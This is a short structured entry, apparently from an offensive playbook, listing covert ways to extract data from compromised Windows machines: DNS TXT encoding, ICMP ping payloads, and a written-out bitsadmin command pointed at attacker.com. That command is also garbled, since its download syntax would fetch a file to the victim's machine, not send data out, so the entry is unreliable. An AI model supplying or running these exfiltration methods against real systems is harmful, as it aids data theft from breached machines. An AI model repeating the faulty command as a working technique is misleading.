name: Windows Data Exfiltration Techniques
description: Multiple covert channels to extract data from compromised Windows systems.

steps.name: DNS TXT Records
steps.description: Encode data in DNS queries; receive via authoritative server logs.

steps.name: ICMP Echo (Ping)
steps.description: Embed payload in ICMP data field.

steps.name: BITSAdmin Transfer
steps.command: bitsadmin /transfer exfilJob /download /priority normal http://attacker.com/upload C:\temp\data.zip C:\temp\null
